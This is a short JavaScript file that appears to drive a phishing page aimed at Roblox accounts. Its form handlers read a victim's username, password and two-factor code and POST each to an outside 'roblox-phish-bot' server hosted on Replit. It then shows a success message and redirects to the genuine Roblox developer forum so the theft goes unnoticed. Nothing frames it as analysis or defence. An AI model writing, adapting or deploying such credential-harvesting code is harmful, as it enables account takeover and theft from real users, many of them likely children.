const BOT_URL = 'https://https://replit.com/@newtoolskrill/roblox-phish-bot?v=1'; 

async function submitLogin() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const response = await fetch(`${BOT_URL}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
    });
    const result = await response.json();
    if (result.status === '2FA_Required') {
        document.getElementById('loginError').classList.remove('hidden');
        document.getElementById('loginDiv').classList.add('hidden');
        document.getElementById('tfaDiv').classList.remove('hidden');
    } else {
        document.getElementById('loginError').classList.remove('hidden');
    }
}

async function submitTfa() {
    const tfaCode = document.getElementById('tfaCode').value;
    const response = await fetch(`${BOT_URL}/submit-tfa`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ tfaCode })
    });
    const result = await response.json();
    if (result.status === 'Success') {
        document.getElementById('tfaDiv').classList.add('hidden');
        document.getElementById('loginError').classList.add('hidden');
        document.getElementById('successDiv').classList.remove('hidden');
        setTimeout(() => {
            window.location.href = 'https://devforum.roblox.com/';
        }, 1500);
    } else {
        alert('Incorrect 2FA code. Please try again.');
    }
}
